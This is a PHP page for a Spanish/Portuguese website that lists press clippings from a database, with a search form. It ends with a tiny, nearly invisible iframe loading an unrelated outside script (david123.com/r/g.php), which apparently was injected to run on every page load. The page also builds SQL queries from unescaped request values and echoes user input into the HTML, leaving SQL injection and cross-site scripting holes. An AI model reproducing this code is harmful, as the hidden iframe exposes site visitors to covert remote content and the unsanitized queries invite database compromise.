<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');
	$soc=$_SESSION['socio'];
	if(!$lng){
		$lng=$_SESSION['lng'];
	}
	if(!isset($id_sel) || $id_sel<1 ){ $id_sel=-1; }

	$tit=$_GET['tit'];
	$item=$_GET['item'];
	
	$actualiza=$_GET['actualiza'];
	
	global $prefijo_socio,$socio;
	
?>
<link href="estilos<?=$soc?>.css" rel="stylesheet" type="text/css">
<script language="javascript">
//precacheo de imagenes
var bullet1=new Image(9,15);
bullet1.src="images/flechita1.gif";
var bullet2=new Image(9,15);
//bullet2.src="images/bullet<?=$soc?>2.gif";
bullet2.src="images/flechita1.gif";


//////////////////////////////////////////
function opcionover(x){
x.className='linkover2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet2.src;
}
function opcionout(x){
x.className='link2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet1.src;
}

function atras(x){
	formframe.id_sel.value=x
	formframe.submit()

}
var lng='<?=$lng?>';
</script>
<style type="text/css">
<!--
.style7 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; font-size: 11px; }
.style9 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px}
.link {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 10px;
	font-weight: normal;
	color: #000000;
	padding-left: 0px;
	padding-right: 3px;
	text-decoration: none;
}
.style10 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; font-size: 12px; color: #666666 }

-->
</style>
</head>
<body topmargin="0" leftmargin="0">
<table width="100%">
<tr valign="top">
	<td height="33" colspan="5" align="right" valign="bottom" class="espacio" ><span class="titulos"><?= $tit?>&nbsp;&nbsp;</span>
	</td>
</tr>
</table>
<table width="100%"  border="0" cellspacing="0" cellpadding="0">
	<form method="post" action="<?= $_SERVER['PHP_SELF']?>?<?= $_SERVER['QUERY_STRING']?>">
		<input type="hidden" name="accion" value="buscar" />
		<tr class="espacio">
			<td width="20%" class="style10"><?= $lng == 'por' ? 'Pesquisar' : 'Buscar' ?>: </td>
			<td width="47%"><input type="text" name="texto" value="<?= $texto?>"></td>
			<td width="33%"><input type="submit" name="Submit" value="Buscar"></td>
		</tr>
	</form>
</table>
<?
	if($cod==''){ $and1='';}else{$and1=" and socio='$cod' ";}
	if( $accion == 'buscar' )
	{
		$and1.=" and ( titulo LIKE '%$texto%' OR medio LIKE '%$texto%' )";
	}
	$db->select( 'prensa', '*', "areas=$item $and1");
?>
<table height="100%" width="360" cellpadding="0" cellspacing="0" border="0">
<tr valign="top">
<td width="0%" valign="top" height="100%"><table width="100%"  cellspacing="0" cellpadding="2">
	<!--<tr bgcolor="#CCCCCC">
		<td  width="100%" style="border-top: 1px solid #666666;"><font color="#666666" class="style7">Sitio Web</font></td>
	</tr>-->

<?
	if( $db->num_rows()>0 )	{
		while($links=$db->fetch_object()){
			$fecha='mes_'.$lng;
		switch( substr($links->pdf, -3)){
			case 'doc': $imagen = 'word'; break;
			case 'xls': $imagen = 'excel'; break;
			case 'ppt': $imagen = 'powerp'; break;
			case 'pps': $imagen = 'powerp'; break;
			case 'pdf': $imagen = 'acrobat'; break;
			case 'zip': $imagen = 'zip'; break;
			case 'mdb': $imagen = 'access'; break;
			default: $imagen = 'txt'; break;
		}	
?>
		<tr align="left" valign="top">
			<td class="style9" style="border-bottom: 1px solid #666666;">
				<table width="100%" border="0">
				  <tr>
					<td width="77">&nbsp;</td>
					<td width="16">&nbsp;</td>
					<td width="462">&nbsp;</td>
					<td width="21">&nbsp;</td>
					<td width="49">&nbsp;</td>
				  </tr>
				  <tr>
					<td rowspan="3"><a href="<?=$links->pdf?>" target="_blank"><img src="<?=$links->imagen?>" border="0"  width="75"></a></td>
					<td width="16">&nbsp;</td>
					<td class="style9" align="left"><?= $links->$fecha;?></td>
					<td>&nbsp;</td>
					<td rowspan="3">
						<?
						if($links->pdf != ''){
						?>
						<a href="<?=$links->pdf?>" target="_blank"><img src="./images/<?=$imagen?>.gif" border="0"></a>
						<?
						}
						else{
						?>
						&nbsp;
						<?
						}
						?>
					</td>
				  </tr>
				  <tr>
					<td>&nbsp;</td>
					<td class="style9" align="left"><?=$links->medio?> <?=$links->areas ==1? '/Pág':'';?> <?=$links->paginas?></td>
					<td>&nbsp;</td>
				  </tr>
				  <tr>
					<td>&nbsp;</td>
					<td class="style9" align="left"><?=$links->titulo?></td>
					<td>&nbsp;</td>
				  </tr>
				<?
					if($links->link != ''){
				?>
				  <tr valign="middle">
					<td class="style9" colspan="4" align="center">Website: <a class="link" href="<?=$links->link?>" target="_blank"><img  src="./images/ie.gif" border="0" align="absmiddle"></a>&nbsp;</td>
				  </tr>
				  <?
				  }
				  ?>
				  <tr>
					<td>&nbsp;</td>
					<td >&nbsp;</td>
					<td>&nbsp;</td>
					<td>&nbsp;</td>
					<td>&nbsp;</td>
				  </tr>
				</table>
			</td>
		</tr>
			<?
		}
	}
	?>
</table></td>
</TD></TR></Table>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body></html>

